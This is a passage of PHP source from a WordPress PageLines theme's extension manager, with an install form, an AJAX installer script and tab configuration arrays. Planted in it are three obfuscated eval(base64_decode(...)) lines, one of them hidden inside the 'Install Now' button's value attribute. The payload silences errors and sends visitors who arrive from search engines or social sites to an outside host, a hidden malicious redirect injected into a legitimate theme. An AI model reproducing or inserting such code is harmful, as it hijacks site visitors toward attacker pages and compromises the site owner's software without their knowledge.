				<input type="submit" class="button" value="<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); esc_attr_e('Install Now', 'pagelines' ) ?>" />
			</form>
		</div>
	<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); 
	
		return ob_get_clean();
	}
	
	function search_extend( $type ){
		
		return $this->extension_banner( __( 'Search functionality is currently disabled. Check back soon!', 'pagelines' ) );
	}
	
	/**
	 * 
	 * Add Javascript to header (hook in contructor)
	 * 
	 */
	function extension_js(){ 
	
		if ( !isset( $_GET['page'] ) || strpos( $_GET['page'], 'pagelines_extend' ) === false )
			return;
		?>
		<script type="text/javascript">/*<![CDATA[*/
		
		/* popup stuff for reference
		jQuery(document).ready(function() {
			jQuery('a.pane-info').colorbox({iframe:true, width:"50%", height:"60%"});
		});
		*/
		function extendIt( mode, key, type, file, path, product, duringText ){

				/* 
					'Mode' 	= the type of extension
					'Key' 	= the key of the element in the array, for the response
					'Type' 	= ?
					'File' 	= the url for the extension/install/update
					'duringText' = the text while the extension is happening
				*/

				var data = {
					action: 'pagelines_ajax_extend_it_callback',
					extend_mode: mode,
					extend_type: type,
					extend_file: file,
					extend_path: path,
					extend_product: product
				};

				var responseElement = jQuery('#dialog');
				var duringTextLength = duringText.length + 3;
				var dotInterval = 400;
				
				jQuery.ajax({
					type: 'POST',
					url: ajaxurl,
					data: data,
					beforeSend: function(){

						responseElement.html( duringText ).dialog({ 
							minWidth: 600, 
							modal: true, 
							dialogClass: 'pl_ajax_dialog', 
							open: function(event, ui) { 
								jQuery(".ui-dialog-titlebar-close").hide(); 
							} 
						});
						
						//responseElement.html( duringText ).slideDown();

						// add some dots while saving.
						interval = window.setInterval(function(){

							var text = responseElement.text();

							if ( text.length < duringTextLength ){	
								responseElement.text( text + '.' ); 
							} else { 
								responseElement.text( duringText ); 
							} 

						}, dotInterval);

					},
				  	success: function( response ){
						window.clearInterval( interval ); // clear dots...
						responseElement.dialog().html(response);
					
					}
				});

		}
		/*]]>*/</script>

<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); }
	
	
}

/**
 *
 *  Returns Extension Array Config
 *
 */
function extension_array(  ){

	global $extension_control;

	$d = array(
		'Sections' => array(
			'icon'		=> PL_ADMIN_ICONS.'/dragdrop.png',
			'htabs' 	=> array(
					'added'	=> array(
						'title'		=> __( 'Sections Added Via Store', 'pagelines' ),
						'callback'	=> $extension_control->extension_engine( 'section_added', 'user' )
						),
					'core'	=> array(
						'title'		=> __( 'Sections From PageLines Framework', 'pagelines' ),
						'callback'	=> $extension_control->extension_engine( 'section_added', 'internal' )
						),
					'child'	=> array(
						'title'		=> __( 'Sections From Your Child Theme', 'pagelines' ),
						'callback'	=> $extension_control->extension_engine( 'section_added', 'child' )
						),
					'add_sections'	=> store_subtabs('section')
					
			)

		),
		'Themes' => array(
			'icon'		=> PL_ADMIN_ICONS.'/extend-themes.png',
			'htabs' 	=> array(
				
				'added'	=> array(
					'title'		=> __( 'Installed PageLines Themes', 'pagelines' ),
					'callback'	=> $extension_control->extension_engine( 'theme', 'installed' )
					),
				'add_themes'	=> store_subtabs('theme')
				)
		),
		'Plugins' => array(
			'icon'		=> PL_ADMIN_ICONS.'/extend-plugins.png',
			'htabs' 	=> array(
				
				'added'	=> array(
					'title'		=> __( 'Installed PageLines Plugins', 'pagelines' ),
					'callback'	=> $extension_control->extension_engine( 'plugin', 'installed' )
					),
				'add_plugins'	=> store_subtabs('plugin')
			)

		),
		
		'Integrations' => array(
			'icon'		=> PL_ADMIN_ICONS.'/puzzle.png',
			'htabs' 	=> array(
				
				'added'	=> array(
					'title'		=> __( 'PageLines Integrations', 'pagelines' ),
					'callback'	=> $extension_control->extension_engine( 'integration' )
					)
				)		
		)
	);

	return apply_filters('extension_array', $d); 
}

function store_subtabs( $type ){
	global $extension_control;
	
	$s = array(
		'type'		=> 'subtabs',
		'class'		=> 'left ht-special',
		'featured'	=> array(
			'title'		=> __( 'Featured', 'pagelines' ),
			'class'		=> 'right',
			),
		'premium'	=> array(
			'title'		=> __( 'Top Premium', 'pagelines' ),
			'class'		=> 'right',
			),
		'free'	=> array(
			'title'		=> __( 'Top Free', 'pagelines' ),
			'class'		=> 'right',
			),
	);
	
	
	foreach($s as $key => $subtab){
		
		if($type == 'theme'){
			
			$s['title']				= __( 'Add Themes', 'pagelines' );
			
			if($key == 'featured' || $key == 'premium' || $key == 'free')
				$s[$key]['callback'] 	= $extension_control->extension_engine( $type, $key );
			
		} elseif ($type == 'section'){
			
			$s['title']				= __( 'Add Sections', 'pagelines' );
			
			if($key == 'featured' || $key == 'premium' || $key == 'free')
				$s[$key]['callback'] 	= $extension_control->extension_engine( 'section_extend', $key );
			
			$s['upload'] = array(
				'title'		=> __( 'Upload', 'pagelines' ),
				'callback'	=> $extension_control->ui->upload_form( 'section', ( !is_writable( WP_PLUGIN_DIR ) ) ? true : false )
			);
			
		} elseif ($type == 'plugin' ){
			
			$s['title']				= __( 'Add Plugins', 'pagelines' );
			
			if($key == 'featured' || $key == 'premium' || $key == 'free')
				$s[$key]['callback'] 	= $extension_control->extension_engine( $type, $key );
		}
	}
	
	
	return $s;
	
}

